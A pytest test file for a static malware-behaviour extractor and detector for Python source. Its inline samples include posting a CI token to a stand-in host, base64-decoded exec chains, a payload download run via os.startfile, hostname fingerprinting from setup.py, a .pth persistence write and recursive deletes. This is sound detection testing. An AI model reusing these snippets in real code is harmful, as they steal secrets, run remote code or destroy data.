import warnings
from pathlib import Path

from malir.detector import decide
from malir.extractor import ExtractorLimits, PythonExtractor

FIXTURES = Path(__file__).parent / "fixtures"


def test_aliases_and_exfil_motif_are_extracted():
    result = PythonExtractor().analyze_file(FIXTURES / "suspicious" / "static_exfil.py")
    operations = [event.op for event in result.events]
    motifs = [path.motif for path in result.behavior_paths]
    assert "ENV_READ" in operations
    assert "ENCODE" in operations
    assert "NETWORK_SEND" in operations
    assert "credential_or_file_exfil" in motifs


def test_nested_decode_precedes_dynamic_execution():
    result = PythonExtractor().analyze_file(FIXTURES / "suspicious" / "encoded_exec.py")
    operations = [event.op for event in result.events]
    assert operations.index("DECODE") < operations.index("DYNAMIC_EXEC")
    assert "encoded_execution" in [path.motif for path in result.behavior_paths]


def test_top_level_source_is_not_executed():
    source = "raise RuntimeError('must never run')\nimport os\nos.getenv('X')"
    result = PythonExtractor().analyze_source(source)
    assert result.parse_error is None
    assert any(event.op == "ENV_READ" for event in result.events)


def test_syntax_error_is_a_result_not_an_exception():
    result = PythonExtractor().analyze_source("def broken(:\n")
    assert result.parse_error
    assert result.events == []


def test_tokens_are_deterministic():
    source = "import os\nvalue = os.getenv('TOKEN')"
    extractor = PythonExtractor()
    assert (
        extractor.analyze_source(source).tokens
        == extractor.analyze_source(source).tokens
    )


def test_generic_get_method_is_not_assumed_to_be_network():
    result = PythonExtractor().analyze_source("config.get('key')")
    assert "NETWORK_RECEIVE" not in [event.op for event in result.events]


def test_known_client_factory_alias_is_resolved():
    source = (
        "import requests\n"
        "session = requests.Session()\n"
        "session.post('https://example.invalid', data=b'x')\n"
    )
    result = PythonExtractor().analyze_source(source)
    assert "NETWORK_SEND" in [event.op for event in result.events]


def test_event_limit_is_explicit():
    extractor = PythonExtractor(ExtractorLimits(max_events=1))
    result = extractor.analyze_source("import os\nimport sys\n")
    assert len(result.events) == 1
    assert result.event_limit_reached is True
    assert decide([result]).verdict == "review"


def test_untrusted_syntax_warning_is_not_written_to_process_logs():
    source = "value = '" + chr(92) + "M'\n"
    with warnings.catch_warnings(record=True) as caught:
        warnings.simplefilter("always")
        result = PythonExtractor().analyze_source(source, "untrusted.py")
    assert result.parse_error is None
    assert caught == []


def test_unittest_setup_method_is_runtime_not_install_phase():
    source = "class Case:\n    def setUp(self):\n        exec('value = 1')\n"
    result = PythonExtractor().analyze_source(source, "test_example.py")
    dynamic = next(event for event in result.events if event.op == "DYNAMIC_EXEC")
    assert dynamic.phase == "runtime"
    assert "install_time_execution" not in [
        path.motif for path in result.behavior_paths
    ]


def test_untyped_write_receiver_is_not_assumed_to_be_a_file():
    source = (
        "def render(handle):\n    handle.write('.. toctree::\\n   :maxdepth: 1\\n')\n"
    )
    result = PythonExtractor().analyze_source(source)
    assert "FILE_WRITE" not in [event.op for event in result.events]
    assert "PERSISTENCE_WRITE" not in [event.op for event in result.events]


def test_handle_assigned_from_open_remains_a_typed_file_sink():
    source = "handle = open('artifact.py', 'w')\nhandle.write('generated source')\n"
    result = PythonExtractor().analyze_source(source)
    writes = [event for event in result.events if event.op == "FILE_WRITE"]
    assert len(writes) == 2
    assert {event.target for event in writes} == {"artifact.py"}


def test_tokenizer_filename_is_not_a_sensitive_file_marker():
    source = "from pathlib import Path\ntext = Path('tokenizer.py').read_text()\n"
    result = PythonExtractor().analyze_source(source)
    operations = [event.op for event in result.events]
    assert "FILE_READ" in operations
    assert "SENSITIVE_FILE_READ" not in operations


def test_path_write_text_uses_receiver_as_destination():
    source = (
        "from pathlib import Path\n"
        "Path('/tmp/sitecustomize.pth').write_text('import hook')\n"
    )
    result = PythonExtractor().analyze_source(source)
    event = next(event for event in result.events if event.op == "PERSISTENCE_WRITE")
    assert event.target == "/tmp/sitecustomize.pth"


def test_pth_marker_requires_pth_filename_not_substring():
    source = (
        "from pathlib import Path\n"
        "Path('/tmp/maxdepth.txt').write_text('documentation')\n"
    )
    result = PythonExtractor().analyze_source(source)
    assert "PERSISTENCE_WRITE" not in [event.op for event in result.events]


def test_module_defined_compile_helper_is_not_treated_as_builtin_execution():
    source = (
        "def run(value):\n"
        "    return compile(value)\n\n"
        "def compile(value):\n"
        "    return value\n"
    )
    result = PythonExtractor().analyze_source(source)
    assert "DYNAMIC_EXEC" not in [event.op for event in result.events]


def test_explicit_builtins_compile_is_compilation_not_execution():
    source = (
        "import builtins\n"
        "def run(value):\n"
        "    return builtins.compile(value, '<value>', 'exec')\n"
    )
    result = PythonExtractor().analyze_source(source)
    operations = [event.op for event in result.events]
    assert "CODE_COMPILE" in operations
    assert "DYNAMIC_EXEC" not in operations


def test_literal_dunder_import_is_context_not_dynamic_loading():
    source = (
        "first = __import__('ast')\n"
        "second = __import__('ast')\n"
        "name = 'json'\n"
        "third = __import__(name)\n"
    )
    result = PythonExtractor().analyze_source(source)
    operations = [event.op for event in result.events]
    assert operations.count("IMPORT") == 1
    assert operations.count("DYNAMIC_IMPORT") == 1


def test_temporary_cleanup_does_not_become_destructive_behavior():
    result = PythonExtractor().analyze_source(
        "def cleanup():\n    os.remove('cache.tmp')\n",
        "cleanup.py",
    )
    assert [event.op for event in result.events] == ["FILE_DELETE"]
    assert result.events[0].detail == "file deletion"
    assert "destructive_file_action" not in [
        path.motif for path in result.behavior_paths
    ]
    assert "code-to-filesystem-delete" not in result.effect_summary.flows
    assert result.effect_summary.primary_purpose == "unknown"
    decision = decide([result])
    assert decision.rule_score == 10.0
    assert decision.verdict == "low-signal"


def test_user_data_and_recursive_delete_remain_destructive():
    user_data = PythonExtractor().analyze_source(
        "def wipe():\n    os.remove('user_documents')\n"
    )
    recursive = PythonExtractor().analyze_source(
        "def wipe():\n    shutil.rmtree('payloads')\n"
    )
    build_cleanup = PythonExtractor().analyze_source(
        "def cleanup():\n    shutil.rmtree('build')\n"
    )
    assert "destructive_file_action" in [
        path.motif for path in user_data.behavior_paths
    ]
    assert "destructive_file_action" in [
        path.motif for path in recursive.behavior_paths
    ]
    assert "destructive_file_action" not in [
        path.motif for path in build_cleanup.behavior_paths
    ]


def test_effect_summary_recognizes_explicit_local_code_transformer():
    source = (
        "import ast\n"
        "import sys\n\n"
        "class Rewrite(ast.NodeTransformer):\n"
        "    pass\n\n"
        "def transform(source_path, output_path):\n"
        "    with open(source_path, 'r') as source_file:\n"
        "        tree = ast.parse(source_file.read())\n"
        "    compile(tree, '<generated>', 'exec')\n"
        "    with open(output_path, 'w') as output_file:\n"
        "        output_file.write(ast.unparse(tree))\n\n"
        "if __name__ == '__main__':\n"
        "    transform(sys.argv[1], sys.argv[2])\n"
    )
    result = PythonExtractor().analyze_source(source, "transformer.py")
    summary = result.effect_summary
    assert summary.primary_purpose == "local-code-transformer"
    assert summary.purpose_candidates[0].confidence == "high"
    assert "local-file-to-local-artifact" in summary.flows
    assert "code-generation" in summary.transformations
    assert "EFFECT:ORIGIN:local_file" in summary.tokens
    assert "EFFECT:DESTINATION:local_artifact" in summary.tokens
    assert "PURPOSE:local_code_transformer|Q:high" in summary.tokens


def test_proximity_path_is_not_promoted_to_causal_effect_flow():
    source = """
import os
import requests

def collect():
    secret = os.getenv("CI_TOKEN")
    harmless = "hello"
    requests.post("https://example.invalid/telemetry", data=harmless)
"""
    result = PythonExtractor().analyze_source(source, "telemetry.py")
    path = next(
        item
        for item in result.behavior_paths
        if item.motif == "credential_or_file_exfil"
    )
    assert path.evidence_kind == "proximity"
    assert path.confidence == "low"
    assert "sensitive-data-to-network" not in result.effect_summary.flows
    assert "PATH:credential_or_file_exfil|K:proximity|Q:low" in result.tokens
    assert "PURPOSE:sensitive_data_transfer|Q:low" in result.tokens


def test_network_effect_blocks_local_transformer_purpose_candidate():
    source = """
import ast
import requests
import sys


def transform(source_path, output_path):
    with open(source_path, "r") as source_file:
        text = source_file.read()
    tree = ast.parse(text)
    compile(tree, "<generated>", "exec")
    with open(output_path, "w") as output_file:
        output_file.write(ast.unparse(tree))
    requests.post("https://example.invalid/upload", data=text)


if __name__ == "__main__":
    transform(sys.argv[1], sys.argv[2])
"""
    result = PythonExtractor().analyze_source(source, "transformer.py")

    assert result.effect_summary.primary_purpose != "local-code-transformer"


def test_literal_dunder_import_chain_recovers_nested_capabilities():
    source = (
        "__import__('builtins').exec("
        "__import__('builtins').compile("
        "__import__('base64').b64decode('YQ=='), '<x>', 'exec'))\n"
    )
    result = PythonExtractor().analyze_source(source, "encoded.py")
    operations = [event.op for event in result.events]
    assert "DECODE" in operations
    assert "CODE_COMPILE" in operations
    assert "DYNAMIC_EXEC" in operations
    path = next(p for p in result.behavior_paths if p.motif == "encoded_execution")
    assert path.evidence_kind == "dataflow"
    assert path.confidence == "high"


def test_legacy_urlopen_staged_file_and_startfile_form_download_execute():
    source = r"""
import os
import urllib

def init():
    remote = urllib.urlopen('https://example.invalid/payload.exe')
    payload = remote.read()
    output = open('download.exe', 'w')
    output.write(payload)
    os.startfile(os.getcwd() + '\\download.exe')
"""
    result = PythonExtractor().analyze_source(source, "legacy.py")
    operations = [event.op for event in result.events]
    assert "NETWORK_RECEIVE" in operations
    assert "PROCESS_EXEC" in operations
    path = next(p for p in result.behavior_paths if p.motif == "download_execute")
    assert path.evidence_kind == "dataflow"


def test_dotted_dunder_import_is_not_assumed_to_return_full_module():
    source = "__import__('urllib.request').urlopen('https://example.invalid')\n"
    result = PythonExtractor().analyze_source(source, "dynamic.py")
    assert "NETWORK_RECEIVE" not in [event.op for event in result.events]


def test_generic_environment_value_is_not_labeled_as_credential_exfiltration():
    sensitive = PythonExtractor().analyze_source(
        "import os, requests\nrequests.post('https://x.invalid', data=os.getenv('CI_TOKEN'))\n"
    )
    generic = PythonExtractor().analyze_source(
        "import os, requests\nrequests.post('https://x.invalid', data=os.getenv('API_URL'))\n"
    )
    assert any(
        path.motif == "credential_or_file_exfil" for path in sensitive.behavior_paths
    )
    assert not any(
        path.motif == "credential_or_file_exfil" for path in generic.behavior_paths
    )


def test_local_aliases_do_not_leak_across_functions_or_shadowed_modules():
    source = """
import requests
import socket

def make_socket():
    stream = socket.socket()

def consume(stream):
    stream.send(b"hello")

def shadow_parameter(socket):
    socket.socket().send(b"hello")

def shadow_module():
    requests = object()
    requests.post("https://example.invalid")
"""
    result = PythonExtractor().analyze_source(source, "scope.py")
    network = [event for event in result.events if event.op.startswith("NETWORK_")]
    assert network == []


def test_class_aliases_do_not_leak_into_method_or_following_module_scope():
    source = """
import socket

class Client:
    stream = socket.socket()

    def method(self):
        stream.send(b"hello")

def later():
    stream.send(b"hello")
"""
    result = PythonExtractor().analyze_source(source, "class_scope.py")
    network = [event for event in result.events if event.op.startswith("NETWORK_")]
    assert network == []


def test_verified_ssl_socket_wrapper_preserves_network_receiver_type():
    source = """
import base64
import socket
import ssl

def report():
    payload = base64.b64encode(socket.gethostname().encode())
    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    stream = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    secure = context.wrap_socket(stream, server_hostname="example.invalid")
    secure.connect(("example.invalid", 443))
    secure.send(payload)
"""
    result = PythonExtractor().analyze_source(source, "setup.py")
    operations = [event.op for event in result.events]
    assert "NETWORK_RECEIVE" in operations
    assert "NETWORK_SEND" in operations
    path = next(
        p for p in result.behavior_paths if p.motif == "fingerprinting_transfer"
    )
    assert path.evidence_kind == "dataflow"
    assert path.confidence == "high"


def test_untyped_wrap_socket_name_does_not_create_network_events():
    source = """
def forward(wrapper, stream, payload):
    secure = wrapper.wrap_socket(stream)
    secure.send(payload)
"""
    result = PythonExtractor().analyze_source(source, "wrapper.py")
    assert not any(event.op.startswith("NETWORK_") for event in result.events)


def test_get_query_tracks_host_and_file_provenance_without_secret_escalation():
    host = PythonExtractor().analyze_source(
        'import requests, socket\nrequests.get("https://x.invalid/?h=" + socket.gethostname())\n'
    )
    file = PythonExtractor().analyze_source(
        'import requests\ndef f(path):\n data=open(path).read()\n requests.get("https://x.invalid/?d=" + data)\n'
    )
    secret = PythonExtractor().analyze_source(
        'import os, requests\nrequests.get("https://x.invalid/?t=" + os.getenv("CI_TOKEN"))\n'
    )
    assert any(
        p.motif == "fingerprinting_transfer" and p.evidence_kind == "dataflow"
        for p in host.behavior_paths
    )
    assert any(
        p.motif == "file_to_network" and p.evidence_kind == "dataflow"
        for p in file.behavior_paths
    )
    assert not any(p.motif == "credential_or_file_exfil" for p in secret.behavior_paths)


def test_dotted_import_binds_top_level_name_without_repeating_submodule():
    direct = PythonExtractor().analyze_source(
        'import urllib.request\nurllib.request.urlretrieve("https://x.invalid/a", "a.zip")\n'
    )
    aliased = PythonExtractor().analyze_source(
        'import urllib.request as req\nreq.urlretrieve("https://x.invalid/a", "a.zip")\n'
    )
    for result in (direct, aliased):
        receives = [event for event in result.events if event.op == "NETWORK_RECEIVE"]
        assert len(receives) == 1
        assert receives[0].target == "https://x.invalid/a"
